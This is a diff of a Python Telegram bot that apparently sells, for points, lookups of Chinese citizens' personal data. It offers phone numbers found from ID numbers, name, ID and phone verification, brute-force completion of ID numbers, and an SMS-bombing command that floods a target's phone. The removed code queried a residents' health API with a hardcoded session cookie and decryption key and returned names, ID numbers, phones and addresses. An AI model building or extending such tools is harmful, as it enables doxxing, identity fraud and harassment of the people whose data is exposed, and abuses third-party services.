@@ -65,7 +65,7 @@ def save_token(new_tk):
     with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
         f.write(new_tk)
 
-# ================= 2. 解密与查询逻辑 =================
+# ================= 2. 解密函數（通用，保留給可能其他地方使用） =================
 
 def decrypt_data(encrypted_text_hex, key):
     try:
@@ -86,6 +86,8 @@ def decrypt_data(encrypted_text_hex, key):
     except (binascii.Error, ValueError, json.JSONDecodeError) as e:
         return {"error": str(e)}
 
+# ================= 常用号查询逻辑 =================
+
 def xiaowunb_query_logic(chat_id, id_number, uid):
     base_url = "http://xiaowunb.top/cyh.php"
     params = {"sfz": id_number}
@@ -99,37 +101,6 @@ def xiaowunb_query_logic(chat_id, id_number, uid):
         bot.send_message(chat_id, result_message, parse_mode='Markdown')
     except Exception as e:
         bot.send_message(chat_id, f"❌ 接口请求失败: {e}")
-
-def hb_search_logic(chat_id, search_value, uid):
-    url = "https://api.91jkj.com/residentshealth"
-    headers = {
-        "ACTION": "CM019", "LONGITUDE": "114.900015", "SESSION_ID": "7B243BE72768807FD09C55B8763BDBCB",
-        "LATITUDE": "26.796795", "Connection": "Keep-Alive", "ORDER_YYFSDM": "1", "SOURCE": "1",
-        "isEncrypt": "1", "Content-Type": "application/x-www-form-urlencoded", "Host": "api.91jkj.com",
-        "Accept-Encoding": "gzip", "Cookie": "acw_tc=0bd17c6617316858716663239e5577a2ed3657cc2b8ad00f782bcd8f9d741a", "User-Agent": "okhttp/3.14.9"
-    }
-    try:
-        response = requests.post(url, data={"search": search_value}, headers=headers)
-        result_json = json.loads(response.text)
-        encrypted_text_hex = result_json.get('data')
-        if encrypted_text_hex:
-            result_data = decrypt_data(encrypted_text_hex, '26556e9bb82743358da7860606b8f29626556e9bb8274335')
-            if "error" in result_data:
-                bot.send_message(chat_id, result_data["error"])
-            elif "page" in result_data and result_data["page"]:
-                user_points[uid] -= 3.5
-                save_points()
-                result_message = "✅查询结果:\n"
-                for item in result_data["page"]:
-                    result_message += f"姓名:{item['resName']}\n证件:{item['sfcode']}\n手机:{item['mobile']}\n地址:{item['address']}\n\n"
-                result_message += f"已扣除 **3.5** 积分！\n当前积分余额：**{user_points[uid]:.2f}** 积分"
-                bot.send_message(chat_id, result_message.strip(), parse_mode='Markdown')
-            else:
-                bot.send_message(chat_id, "查询为空")
-        else:
-            bot.send_message(chat_id, "响应中data字段为空")
-    except:
-        bot.send_message(chat_id, "查询接口请求异常")
 
 # ================= 三要素查询逻辑 =================
 
@@ -163,7 +134,7 @@ def query_3ys_logic(chat_id, name, id_card, phone, uid):
     except Exception as e:
         bot.send_message(chat_id, f"❌ 查询失败：{str(e)}")
 
-# ================= 3. 辅助功能 =================
+# ================= 辅助功能 =================
 
 def get_id_check_code(id17):
     factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
@@ -205,7 +176,7 @@ def get_ui_bar(done, total):
     bar = "█" * filled + "░" * (bar_len - filled)
     return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"
 
-# ================= 4. 核验逻辑 =================
+# ================= 核验逻辑 =================
 
 def single_verify_2ys(chat_id, name, id_card, uid):
     url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
@@ -253,7 +224,7 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 短信轰炸 =================
+# ================= 短信轰炸 =================
 
 def get_all_senders():
     all_funcs = []
@@ -292,7 +263,7 @@ def sms_bomb_cmd(message):
         bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
     threading.Thread(target=do_bomb).start()
 
-# ================= 6. 管理与业务指令 =================
+# ================= 管理与业务指令 =================
 
 @bot.message_handler(commands=['cyh'])
 def cyh_cmd(message):
@@ -300,11 +271,6 @@ def cyh_cmd(message):
     if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足(2.5)！")
     user_states[message.chat.id] = {'step': 'cyh_id'}
     bot.send_message(message.chat.id, "请输入要查询的身份证号：")
-
-@bot.message_handler(commands=['hb'])
-def hb_cmd(message):
-    if user_points.get(message.from_user.id, 0.0) < 3.5: return bot.reply_to(message, "积分不足！")
-    bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")
 
 @bot.message_handler(commands=['3ys'])
 def cmd_3ys(message):
@@ -316,9 +282,9 @@ def cmd_3ys(message):
         message.chat.id, 
         "请输入三要素信息：\n\n"
         "**格式示例（顺序随意）：**\n"
-        "`杨志强 411524200205296514 13800138000`\n"
-        "`杨志强 13800138000 411524200205296514`\n"
-        "`杨志强,411524200205296514,13800138000`\n\n"
+        "`姓名 身份证 手机号`\n"
+        "`姓名 手机号 身份证`\n"
+        "`姓名,身份证,手机号`\n\n"
         "姓名 + 身份证 + 手机号（任一順序）",
         parse_mode='Markdown'
     )
@@ -372,8 +338,8 @@ def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return 
     
-    # ================= 自动识别三要素（姓名+身份证+手机号 任意顺序） =================
-    if chat_id not in user_states or not user_states[chat_id].get('step'):  # 不在其他流程中才自动识别
+    # ================= 自動識別三要素（姓名+身份证+手机号 任意順序） =================
+    if chat_id not in user_states or not user_states[chat_id].get('step'):
         parts = re.split(r'[,/\s]+', text.strip())
         if len(parts) == 3:
             name_cand = phone_cand = id_cand = None
@@ -384,30 +350,29 @@ def handle_all(message):
                 elif re.match(r'^1[3-9]\d{9}$', p):
                     phone_cand = p
                 elif re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', p):
-                    id_cand = p.upper()  # 统一大写 X
+                    id_cand = p.upper()
             
             if name_cand and phone_cand and id_cand:
                 if user_points.get(uid, 0.0) < 1.5:
                     return bot.reply_to(message, "❌ 积分不足！需要 **1.5** 积分", parse_mode='Markdown')
                 return query_3ys_logic(chat_id, name_cand, id_cand, phone_cand, uid)
 
-    # ================= 原有逻辑 =================
-    if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
-        state = user_states.get(chat_id)
-        if state and state['step'] == 'cyh_id':
-            del user_states[chat_id]
-            return xiaowunb_query_logic(chat_id, text, uid)
-            
-        if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
-        return hb_search_logic(chat_id, text, uid)
+    # ================= 自動識別單一身份證 → 查常用号 =================
+    id_pattern_18 = r'^\d{17}[\dXx]$'
+    id_pattern_15 = r'^\d{15}$'
+    if (re.match(id_pattern_18, text) or re.match(id_pattern_15, text)) and \
+       (chat_id not in user_states or not user_states[chat_id].get('step')):
+        if user_points.get(uid, 0.0) < 2.5:
+            return bot.reply_to(message, "❌ 积分不足！查询需要 **2.5** 积分", parse_mode='Markdown')
+        return xiaowunb_query_logic(chat_id, text, uid)
 
-    match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
-    if match_2ys:
-        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足(0.5)")
-        return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
-    
     state = user_states.get(chat_id)
     if not state: return
+
+    if state['step'] == 'cyh_id':
+        del user_states[chat_id]
+        return xiaowunb_query_logic(chat_id, text, uid)
+
     if state['step'] == 'v_name':
         user_states[chat_id].update({'step': 'v_ids', 'name': text})
         bot.send_message(chat_id, f"✅ 姓名：{text}\n请发送身份证列表：")
@@ -450,27 +415,23 @@ def handle_callback(call):
             "——————————————————\n"
             "批量二要素核验\n"
             "发送 /pl 进行核验\n"
-            "每次查询扣除 2.5 积分\n"
+            "每次扣除 2.5 积分\n"
             "——————————————————\n"
             "补齐身份证and核验\n"
-            "发送 /bq 进行查询\n"
-            "每次补齐扣除 0.5 积分\n"
+            "发送 /bq 进行操作\n"
+            "补齐扣除 0.5 积分，核验另計\n"
             "——————————————————\n"
             "二要素核验\n"
             "发送 /2ys 进行核验\n"
-            "每次核验扣除 0.5 积分\n"
+            "每次扣除 0.5 积分\n"
             "——————————————————\n"
             "三要素核验\n"
             "发送 /3ys 进行核验\n"
-            "每次查询扣除 1.5 积分\n"
+            "每次扣除 1.5 积分\n"
             "——————————————————\n"
             "常用号查询\n"
             "发送 /cyh 进行查询\n"
-            "每次查询扣除 2.5 积分\n"
-            "——————————————————\n"
-            "河北全户查询\n"
-            "发送 /hb 进行查询\n"
-            "每次查询扣除 3.5 积分\n"
+            "每次扣除 2.5 积分\n"
         )
         bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
     elif call.data == "view_pay":
